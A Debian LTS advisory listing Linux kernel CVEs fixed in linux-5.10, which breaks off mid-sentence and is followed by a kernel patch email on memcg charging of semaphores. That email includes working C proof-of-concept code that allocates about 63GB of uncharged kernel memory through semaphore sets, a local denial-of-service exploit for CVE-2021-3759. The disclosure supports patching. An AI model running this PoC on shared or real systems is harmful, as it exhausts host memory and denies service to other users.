Debian Bug     : 1022806 1024697

Several vulnerabilities have been discovered in the Linux kernel that
may lead to a privilege escalation, denial of service or information
leaks.

CVE-2021-3759

    It was discovered that the memory cgroup controller did not
    account for kernel memory allocated for IPC objects.  A local user
    could use this for denial of service (memory exhaustion).

CVE-2022-3169

    It was discovered that the NVMe host driver did not prevent a
    concurrent reset and subsystem reset.  A local user with access to
    an NVMe device could use this to cause a denial of service (device
    disconnect or crash).

CVE-2022-3435

    Gwangun Jung reported a flaw in the IPv4 forwarding subsystem
    which would lead to an out-of-bounds read.  A local user with
    CAP_NET_ADMIN capability in any user namespace could possibly
    exploit this to cause a denial of service (crash).

CVE-2022-3521

    The syzbot tool found a race condition in the KCM subsystem
    which could lead to a crash.

    This subsystem is not enabled in Debian's official kernel
    configurations.

CVE-2022-3524

    The syzbot tool found a race condition in the IPv6 stack which
    could lead to a memory leak.  A local user could exploit this to
    cause a denial of service (memory exhaustion).

CVE-2022-3564

    A flaw was discovered in the Bluetooh L2CAP subsystem which
    would lead to a use-after-free.  This might be exploitable
    to cause a denial of service (crash or memory corruption) or
    possibly for privilege escalation.

CVE-2022-3565

    A flaw was discovered in the mISDN driver which would lead to a
    use-after-free.  This might be exploitable to cause a denial of
    service (crash or memory corruption) or possibly for privilege
    escalation.

CVE-2022-3594

    Andrew Gaul reported that the r8152 Ethernet driver would log
    excessive numbers of messages in response to network errors.  A
    remote attacker could possibly exploit this to cause a denial of
    service (resource exhaustion).

CVE-2022-3628

    Dokyung Song, Jisoo Jang, and Minsuk Kang reported a potential
    heap-based buffer overflow in the brcmfmac Wi-Fi driver.  A user
    able to connect a malicious USB device could exploit this to cause
    a denial of service (crash or memory corruption) or possibly for
    privilege escalation.

CVE-2022-3640

    A flaw was discovered in the Bluetooh L2CAP subsystem which
    would lead to a use-after-free.  This might be exploitable
    to cause a denial of service (crash or memory corruption) or
    possibly for privilege escalation.

CVE-2022-3643 (XSA-423)

    A flaw was discovered in the Xen network backend driver that would
    result in it generating malformed packet buffers.  If these
    packets were forwarded to certain other network devices, a Xen
    guest could exploit this to cause a denial of service (crash or
    device reset).

CVE-2022-4139

    A flaw was discovered in the i915 graphics driver.  On gen12 "Xe"
    GPUs it failed to flush TLBs when necessary, resulting in GPU
    programs retaining access to freed memory.  A local user with
    access to the GPU could exploit this to leak sensitive
    information, cause a denial of service (crash or memory
    corruption) or likely for privilege escalation.

CVE-2022-4378

    Kyle Zeng found a flaw in procfs that would cause a stack-based
    buffer overflow.  A local user permitted to write to a sysctl
    could use this to cause a denial of service (crash or memory
    corruption) or possibly for privilege escalation.

CVE-2022-41849

    A race condition was discovered in the smscufx graphics driver,
    which could lead to a use-after-free.  A user able to remove the
    physical device while also accessing its device node could exploit
    this to cause a denial of service (crash or memory corruption) or
    possibly for privilege escalation.

CVE-2022-41850

    A race condition was discovered in the hid-roccat input driver,
    which could lead to a use-after-free.  A local user able to access
    such a device could exploit this to cause a denial of service
    (crash or memory corruption) or possibly for privilege escalation.

CVE-2022-42328, CVE-2022-42329 (XSA-424)

    Yang Yingliang reported that the Xen network backend driver did
    not use the proper function to free packet buffers in one case,
    which could lead to a deadlock.  A Xen guest could exploit this to
    cause a denial of service (hang).

CVE-2022-42895

    Tamás Koczka reported a flaw in the Bluetooh L2CAP subsystem
    that would result in reading uninitialised memory.  A nearby
    attacker able to make a Bluetooth connection could exploit
    this to leak sensitive information.

CVE-2022-42896

    Tamás Koczka reported flaws in the Bluetooh L2CAP subsystem that
    can lead to a use-after-free.  A nearby attacker able to make a
    Bluetooth SMP connection could exploit this to cause a denial of
    service (crash or memory corruption) or possibly for remote code
    execution.

CVE-2022-47518, CVE-2022-47519, CVE-2022-47521

    Several flaws were discovered in the wilc1000 Wi-Fi driver which
    could lead to a heap-based buffer overflow.  A nearby attacker
    could exploit these for denial of service (crash or memory
    corruption) or possibly for remote code execution.

CVE-2022-47520

    A flaw was discovered in the wilc1000 Wi-Fi driver which could
    lead to a heap-based buffer overflow.  A local user with
    CAP_NET_ADMIN capability over such a Wi-Fi device could exploit
    this for denial of service (crash or memory corruption) or
    possibly for privilege escalation.

For Debian 10 buster, these problems have been fixed in version
5.10.158-2~deb10u1.

We recommend that you upgrade your linux-5.10 packages.

For the detailed security status of linux-5.10 please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/linux-5.10>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be

Subject: [[PATCH] memcg: charge semaphores and sem_undo objects](#r)
Date: Thu, 15 Jul 2021 03:14:44 -0400	[[thread overview]](#r)
Message-ID: <1626333284-1404-1-git-send-email-nglaive@gmail.com> (<raw>)

This patch adds accounting flags to semaphores and sem_undo allocation
sites so that kernel could correctly charge these objects.

A malicious user could take up more than 63GB unaccounted memory under
default sysctl settings by exploiting the unaccounted objects. She could
allocate up to 32,000 unaccounted semaphore sets with up to 32,000
unaccounted semaphore objects in each set. She could further allocate one
sem_undo unaccounted object for each semaphore set.

The following code shows a PoC that takes ~63GB unaccounted memory, while
it is charged for only less than 1MB memory usage. We evaluate the PoC on
QEMU x86_64 v5.2.90 + Linux kernel v5.10.19 + Debian buster.

/*------------------------- POC code ----------------------------*/
#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/stat.h>
#include <time.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <sched.h>

#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)

int main(int argc, char *argv[]) {
  int err, semid;
  struct sembuf sops;
  for (int i = 0; i < 31200; ++i) {
    semid = semget(IPC_PRIVATE, 31200, IPC_CREAT);
    if (semid == -1) {
      errExit("semget");
    }
    sops.sem_num = 0;
    sops.sem_op = 1;
    sops.sem_flg = SEM_UNDO;
    err = semop(semid, &sops, 1);
    if (err == -1) {
      errExit("semop");
    }
  }
  while(1);
  return 0;
}
/*-------------------------- end --------------------------------*/

Thanks!
